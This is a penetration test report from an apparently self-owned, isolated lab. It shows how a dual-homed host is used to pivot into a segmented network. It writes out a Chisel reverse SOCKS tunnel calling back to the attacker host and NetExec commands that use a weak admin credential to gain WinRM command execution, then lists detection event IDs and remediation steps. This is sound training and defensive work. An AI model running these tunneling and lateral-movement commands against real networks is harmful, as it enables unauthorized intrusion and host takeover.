# Network Pivoting & Lateral Movement — Penetration Test Report

**Engagement type:** Self-built isolated lab (educational)
**Date:** 2026-11-02
**Author:** Kashyap Naik
**Environment:** VirtualBox 7.2.18 on Windows 11 host (Intel i3-1215U, 16 GB RAM)

---

## 1. Executive Summary

This engagement demonstrates a complete **network pivoting and lateral movement kill chain** inside a deliberately segmented, fully isolated virtual lab. Starting from an attacker host with **no route** to the internal network, the engagement established a tunnel through a dual-homed "pivot" machine and ultimately achieved **administrative remote code execution** on an internal Windows target.

**Key outcome:** A weak local-administrator credential on an internal host, combined with services exposed through a compromised dual-homed server, allowed full compromise of a host the attacker could not even reach directly. This is the textbook demonstration of why **network segmentation alone is not sufficient** — once one bridging host is compromised, segmentation is bypassed via tunneling.

**Result:** `WIN-TARGET01\labadmin` compromised — `(Pwn3d!)` administrative access and PowerShell RCE achieved from the attacker, entirely through the pivot.

---

## 2. Lab Architecture

| Host | Role | IP(s) | Network(s) |
|---|---|---|---|
| **KALI-ATTACKER** | Attacker | 172.16.10.5 | DMZ-NET only |
| **PIVOT01** (Ubuntu 24.04.5) | Dual-homed pivot | 172.16.10.15 / 10.0.0.15 | DMZ-NET + INTERNAL-NET |
| **WIN-TARGET01** (Win 11 LTSC) | Internal target | 10.0.0.25 | INTERNAL-NET only |

Two VirtualBox **Internal Networks** (private L2 switches, no host/internet connectivity):
- `DMZ-NET` — 172.16.10.0/24
- `INTERNAL-NET` — 10.0.0.0/24

```
KALI-ATTACKER ──[DMZ-NET]── PIVOT01 ──[INTERNAL-NET]── WIN-TARGET01
 172.16.10.5              .15 / 10.0.0.15                10.0.0.25
      \__________ cannot reach 10.0.0.0/24 directly __________/
                    (only via the pivot)
```

---

## 3. Scope and Authorization

- **Authorized:** Yes — all assets are self-owned VMs on the author's own laptop.
- **Isolation:** All lab networks are VirtualBox *Internal Networks* with **no bridge/NAT** to the home network or internet during testing. No external systems were touched.
- **Credentials:** All credentials are throwaway, lab-only values created specifically for this exercise. No real/production credentials were used.
- **Out of scope:** The host OS, the home network, any external target.

---

## 4. Network Segmentation (verified)

Segmentation was proven at the packet level before any attack:

| From → To | Result | Evidence |
|---|---|---|
| Kali → PIVOT01 (172.16.10.15) | ✅ reachable | `02-kali-attacker-isolation-proof.png` |
| Kali → WIN-TARGET01 (10.0.0.25) | ❌ **"Network is unreachable"** | `02-...` |
| PIVOT01 → both networks | ✅ reachable | `03-pivot-bridge-reaches-both.png` |
| WIN-TARGET01 → Kali (172.16.10.5) | ❌ "transmit failed. General failure" | `01-windows-target-isolation-proof.png` |

The attacker and target are mutually unreachable; only the dual-homed pivot bridges the two segments. This is the control the rest of the engagement bypasses.

---

## 5. Initial Access

The engagement models a **post-initial-access** scenario: the pivot (PIVOT01) is treated as an already-compromised DMZ server. Its exposed **OpenSSH** service (reachable from the DMZ with lab credentials) is the realistic foothold a pentester would obtain via weak-credential or vulnerable-service exploitation. From that foothold, the operator controls the pivot and begins tunneling.

*Note: a full exploit-driven initial compromise (e.g., weak-SSH brute force or a vulnerable web app) is a documented available vector but was not the focus; the demonstration starts from pivot control.*

---

## 6. Pivoting Methodology

A **Chisel reverse SOCKS5 tunnel** was established:

- **Kali (server):** `chisel server -p 8080 --reverse` — listens on 8080, reverse tunneling enabled.
- **PIVOT01 (client):** `chisel client 172.16.10.5:8080 R:socks` — dials back to Kali and exposes a SOCKS5 proxy on the Kali side at `127.0.0.1:1080`.

Traffic sent to Kali's `127.0.0.1:1080` is tunneled over the single outbound WebSocket connection to the pivot, which then makes the connection to the internal network and returns the response.

**Why reverse?** The pivot initiates the outbound connection to the attacker. This is how a real compromised host "calls home" — it bypasses inbound firewall rules and NAT on the victim side, since only an outbound connection is needed.

Evidence: `04-chisel-client-connected.png`, `05-chisel-socks5-proxy-listening.png`, `06-tunnel-reaches-internal-network.png`.

### Concept distinctions
- **Port forwarding** — one fixed local port maps to one fixed remote host:port.
- **SOCKS proxying** — a dynamic proxy; any destination the pivot can reach is accessible through one proxy port.
- **IP routing** — kernel forwards packets between interfaces (deliberately **not** used here — `ip_forward` left off).
- **Tunneling** — encapsulating traffic inside another protocol (here, TCP/WebSocket) to cross a boundary.
- **Network pivoting** — using a compromised host's network position to reach otherwise-unreachable segments (the umbrella term for all of the above as applied here).

---

## 7. Internal Enumeration

With the tunnel up, the internal target was enumerated through **proxychains** (which wraps tool sockets onto the SOCKS proxy):

- TCP reachability confirmed: `10.0.0.25:445` (SMB) and `:5985` (WinRM) **open** through the tunnel (`08-smb-winrm-open-through-tunnel.png`).
- SMB fingerprint: **Windows 11 / Server 2025 Build 26100 x64, name WIN-TARGET01, SMB signing: True, SMBv1: disabled**.

### Tooling caveats through SOCKS (important)
- **`nc` / single blocking TCP connects** — work reliably through proxychains.
- **`nmap -sT`** — unreliable through proxychains (non-blocking parallel sockets report everything "filtered"); use `-sT --proxies` or single-port `nc` checks instead.
- **WMI/DCOM exec** — fails through SOCKS: DCOM negotiates **dynamic high ports** (observed `49673`) that the tunnel doesn't forward.
- **WinRM (single fixed port 5985)** — tunnels cleanly; the preferred exec method through a pivot.
- **ICMP (ping)** — does not traverse SOCKS at all (TCP-only).

---

## 8. Lateral Movement

The internal host had a **deliberately weak local-administrator account** (`labadmin : Lab@12345`) — the planted misconfiguration.

Through the tunnel, NetExec authenticated and confirmed admin:
```
nxc smb 10.0.0.25 -u labadmin -p 'Lab@12345' --shares
[+] WIN-TARGET01\labadmin:Lab@12345 (Pwn3d!)
ADMIN$  READ,WRITE
C$      READ,WRITE
```
`(Pwn3d!)` = administrative access. Read/write to `C$` and `ADMIN$` = full host control.

Remote code execution over WinRM:
```
nxc winrm 10.0.0.25 -u labadmin -p 'Lab@12345' -X 'whoami; hostname'
[+] Executed command (shell type: powershell)
win-target01\labadmin
WIN-TARGET01
```

Evidence: `07-lateral-movement-pwned.png`, `09-remote-command-execution-rce.png`.

---

## 9. Evidence and Screenshots

| # | File | Shows |
|---|---|---|
| 01 | windows-target-isolation-proof | Target can't reach attacker |
| 02 | kali-attacker-isolation-proof | Attacker can't reach target directly |
| 03 | pivot-bridge-reaches-both | Pivot bridges both networks |
| 04 | chisel-client-connected | Reverse tunnel established |
| 05 | chisel-socks5-proxy-listening | SOCKS5 on Kali 127.0.0.1:1080 |
| 06 | tunnel-reaches-internal-network | proxychains reaches internal host |
| 07 | lateral-movement-pwned | labadmin (Pwn3d!) + admin shares |
| 08 | smb-winrm-open-through-tunnel | 445/5985 open via tunnel |
| 09 | remote-command-execution-rce | PowerShell RCE on target |

---

## 10. Packet Analysis *(pending)*

Planned: tcpdump on PIVOT01 to capture (a) the Chisel WebSocket on DMZ-NET and (b) the resulting SMB/WinRM traffic on INTERNAL-NET, demonstrating how tunneling changes what each monitoring point sees. **Not yet executed.**

---

## 11. Detection Opportunities

**On the pivot (Linux):** a long-lived outbound connection to an unusual host:port (the Chisel WebSocket), an unexpected listening SOCKS process, and the `chisel` binary on disk (flagged as a hacktool by Microsoft Defender when it touched the host — a useful IOC).

**On the Windows target:** the lateral movement is visible in the Security event log —
- **4624** (logon type 3) — successful network logon as `labadmin`
- **4625** — failed logons (during cred testing)
- **4672** — special privileges assigned (admin logon)
- **5140 / 5145** — network share access (`C$`, `ADMIN$`)
- **4688** — process creation (exec methods; enable command-line auditing)
- **5156** — Windows Filtering Platform allowed connections on 445/5985

Required auditing: enable **Logon/Logoff**, **Object Access → File Share**, and **Detailed Tracking → Process Creation** (with command-line inclusion) via Advanced Audit Policy.

---

## 12. Security Impact

- **Confidentiality / Integrity / Availability:** full compromise of the internal host (admin, read/write `C$`). An attacker could read any file, install persistence, or ransom the host.
- **Segmentation bypassed:** the network boundary that should have contained the attacker was defeated by one dual-homed, compromised host plus a weak internal credential.
- **Blast radius:** from one DMZ foothold, the entire internal segment reachable by the pivot is exposed.

---

## 13. Remediation

1. **Kill the bridge:** a DMZ host should not be dual-homed into the internal network. Place any required cross-segment service behind a firewall with explicit, least-privilege allow rules — never a host with a foot in both.
2. **Egress filtering on the pivot:** block/alert on unexpected **outbound** connections (the reverse tunnel relies on the pivot calling out). Default-deny egress.
3. **Strong, unique credentials + no local-admin reuse:** the weak `labadmin:Lab@12345` admin account is the enabler. Enforce LAPS, long passwords, and remove unnecessary local admins.
4. **Host firewall:** keep SMB/WinRM closed to untrusted segments; only allow management from a jump host.
5. **Disable/monitor WinRM** where not needed; require HTTPS + restricted hosts where it is.
6. **Detection:** ship the Event IDs in §11 to a SIEM; alert on hacktool binaries, new listeners, and anomalous egress.
7. **Least privilege & segmentation of segmentation:** micro-segment internal hosts so a single foothold cannot reach the whole subnet.

*Validation of remediation (re-running the attack after applying fixes to prove the path is blocked) is pending.*

---

## 14. Final Validation

**Proven working end-to-end:**
- ✅ Network segmentation (attacker ↔ target mutually unreachable)
- ✅ Reverse SOCKS tunnel via Chisel through the dual-homed pivot
- ✅ Internal enumeration through proxychains
- ✅ Lateral movement: admin compromise (`Pwn3d!`) of WIN-TARGET01
- ✅ Remote code execution over WinRM through the tunnel

**Pending (additive):** packet-capture analysis (§10), blue-team detection walkthrough on live event logs (§11), remediation-and-retest (§13), SSH-based pivoting variants, and the Python automation framework.

---

*All testing performed in an isolated, self-owned lab. No external systems were accessed.*
